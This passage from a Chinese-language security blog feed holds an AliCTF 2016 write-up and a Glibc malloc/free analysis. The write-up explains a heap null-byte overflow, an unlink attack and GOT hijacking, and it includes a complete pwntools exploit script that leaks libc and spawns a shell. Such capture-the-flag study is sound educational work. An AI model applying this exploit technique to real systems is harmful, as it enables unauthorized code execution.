      &lt;p&gt;现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……&lt;/p&gt;
&lt;p&gt;题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AliCTF 2016 fb writeup</title>
    <link href="http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/"/>
    <id>http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/</id>
    <published>2016-06-07T12:33:00.000Z</published>
    <updated>2016-11-01T13:30:05.356Z</updated>
    
    <content type="html"><![CDATA[<p>一道堆中的null byte溢出题</p>
<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>
<a id="more"></a>
<p>由于读取输入的时候会在最后再添加’\x00’：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00000000004008E4                 cdqe</div><div class="line">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class="line">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class="line">.text:00000000004008EE                 add     rax, rdx</div><div class="line">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class="line">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class="line">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>
<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>
<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure>
<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>
<p>然后泄漏出来算下偏移就可以调用system()了</p>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io=process(<span class="string">'./fb'</span>)</div><div class="line"><span class="comment"># io = remote("114.55.103.213",9733)</span></div><div class="line"></div><div class="line">SIZE=<span class="number">0xf8</span></div><div class="line">PLT_puts=<span class="number">0x4006C0</span></div><div class="line">GOT_free=<span class="number">0x602018</span></div><div class="line">GOT_read=<span class="number">0x602040</span></div><div class="line">FD=<span class="number">0x6020C8</span></div><div class="line">BK=<span class="number">0x6020D0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(size)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'1'</span>)</div><div class="line">	io.recvuntil(<span class="string">'length:'</span>)</div><div class="line">	io.sendline(str(size))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'2'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(<span class="string">'content:'</span>)</div><div class="line">	io.sendline(str(content))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(<span class="string">'Done~'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(dst)</span>:</span></div><div class="line">	edit(<span class="number">1</span>,p64(dst)+p64(SIZE)[:<span class="number">-1</span>])</div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(<span class="string">'0'</span>)</div><div class="line">	leakmem = io.recvuntil(<span class="string">"Done~"</span>)[:<span class="number">-6</span>]</div><div class="line">	<span class="keyword">return</span> str(leakmem)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line"></div><div class="line">	payload=p64(<span class="number">0xf1</span>)+p64(<span class="number">0xf1</span>)+p64(FD)+p64(BK)+<span class="string">'A'</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>)</div><div class="line">	<span class="comment"># overflow null byte</span></div><div class="line">	edit(<span class="number">2</span>,payload)</div><div class="line">        <span class="comment"># gdb.attach(io,execute=("b *%s"%(0x400CCF)))</span></div><div class="line">	delete(<span class="number">3</span>)</div><div class="line">        </div><div class="line">	payload2=p64(SIZE)+p64(<span class="number">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class="line">	edit(<span class="number">2</span>,payload2)</div><div class="line"></div><div class="line">	<span class="comment"># modify GOT entry of free to PLT entry of puts</span></div><div class="line">	<span class="comment"># use [:1] to prevent \x00 from causing damage</span></div><div class="line">	edit(<span class="number">2</span>,p64(PLT_puts)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">	<span class="comment"># leak read_addr</span></div><div class="line">	read_addr=u64(leak(GOT_read).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</div><div class="line">	<span class="keyword">print</span> <span class="string">"read_addr: "</span>+str(hex(read_addr))</div><div class="line"></div><div class="line"></div><div class="line">	system_addr=read_addr<span class="number">-0x980C0</span></div><div class="line">	<span class="comment"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class="line">	</div><div class="line">	<span class="comment"># modify free to system</span></div><div class="line">	edit(<span class="number">2</span>,p64(system_addr)[:<span class="number">-1</span>])</div><div class="line">	edit(<span class="number">4</span>,<span class="string">"/bin/sh"</span>)</div><div class="line">	</div><div class="line">	<span class="comment"># now get shell</span></div><div class="line">	io.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">	io.sendline(<span class="string">'3'</span>)</div><div class="line">	io.recvuntil(<span class="string">'index:'</span>)</div><div class="line">	io.sendline(<span class="string">'4'</span>)</div><div class="line"></div><div class="line">	io.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道堆中的null byte溢出题&lt;/p&gt;
&lt;p&gt;程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux下Glibc 堆的malloc及free过程分析</title>
    <link href="http://a7vinx.github.io/2016/05/29/linux_heap_analysis/"/>
    <id>http://a7vinx.github.io/2016/05/29/linux_heap_analysis/</id>
    <published>2016-05-29T13:03:00.000Z</published>
    <updated>2016-11-01T13:08:59.732Z</updated>
    
    <content type="html"><![CDATA[<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>
<a id="more"></a>
<h2 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>
<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>
<h4 id="关于sysmalloc"><a href="#关于sysmalloc" class="headerlink" title="关于sysmalloc"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>
<h4 id="按fast-bin、small-bin、large-bin分"><a href="#按fast-bin、small-bin、large-bin分" class="headerlink" title="按fast bin、small bin、large bin分"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>
<h4 id="关于巨块的分配"><a href="#关于巨块的分配" class="headerlink" title="关于巨块的分配"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>
<h2 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>
<h4 id="来自源码中的注释"><a href="#来自源码中的注释" class="headerlink" title="来自源码中的注释"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>
<h4 id="关于获取Size"><a href="#关于获取Size" class="headerlink" title="关于获取Size"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>
<h2 id="关于堆的收缩"><a href="#关于堆的收缩" class="headerlink" title="关于堆的收缩"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>
<h4 id="来自源码中的注释-1"><a href="#来自源码中的注释-1" class="headerlink" title="来自源码中的注释"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>
<p>最后附一张图：<br><img src="/images/linux_heap_analysis0.png" alt="linux_heap_analysis0.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot;&gt;这篇分析&lt;/a&gt;之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
